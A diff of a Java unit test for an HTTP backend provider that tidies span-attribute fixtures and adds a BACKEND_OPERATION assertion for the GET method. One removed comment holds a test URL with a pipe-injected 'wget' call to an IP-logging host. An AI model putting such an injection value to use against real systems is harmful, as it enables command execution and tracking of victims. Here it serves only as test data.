@@ -81,14 +81,6 @@ public class HttpBackendProviderTest {
                             AttributeValue.newBuilder().setValue("200").build(),
                             Constants.getRawSpanConstant(Http.HTTP_METHOD),
                             AttributeValue.newBuilder().setValue("GET").build(),
-                            //
-                            // Constants.getRawSpanConstant(HTTP_HOST),
-                            //
-                            // AttributeValue.newBuilder().setValue("GET").build(),
-                            //
-                            // Constants.getRawSpanConstant(HTTP_PATH),
-                            //
-                            // AttributeValue.newBuilder().setValue("GET").build(),
                             "http.host",
                             AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                             "http.target",
@@ -117,6 +109,7 @@ public class HttpBackendProviderTest {
                         Request.newBuilder()
                             .setHost("dataservice:9394")
                             .setPath("/product/5d644175551847d7408760b1")
+                            .setMethod("GET")
                             .build())
                     .build())
             .build();
@@ -172,7 +165,9 @@ public class HttpBackendProviderTest {
     assertEquals(
         Map.of(
             "BACKEND_DESTINATION",
-            AttributeValueCreator.create("/product/5d644175551847d7408760b1")),
+            AttributeValueCreator.create("/product/5d644175551847d7408760b1"),
+            "BACKEND_OPERATION",
+            AttributeValueCreator.create("GET")),
         attributes);
   }
 
@@ -548,15 +543,10 @@ public class HttpBackendProviderTest {
                 Attributes.newBuilder()
                     .setAttributeMap(
                         Map.of(
-                            //                                RawSpanConstants.getValue(HTTP_URL),
-                            //
-                            // AttributeValue.newBuilder().setValue("http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7").build(),
-                            //                                RawSpanConstants.getValue(HTTP_HOST),
-                            //
-                            // AttributeValue.newBuilder().setValue("dataservice:9394").build(),
-                            //                                RawSpanConstants.getValue(HTTP_PATH),
-                            //
-                            // AttributeValue.newBuilder().setValue("/api/timelines").build(),
+                            RawSpanConstants.getValue(HTTP_HOST),
+                            AttributeValue.newBuilder().setValue("dataservice:9394").build(),
+                            RawSpanConstants.getValue(HTTP_PATH),
+                            AttributeValue.newBuilder().setValue("/api/timelines").build(),
                             //
                             // RawSpanConstants.getValue(HTTP_REQUEST_QUERY_STRING),
                             //
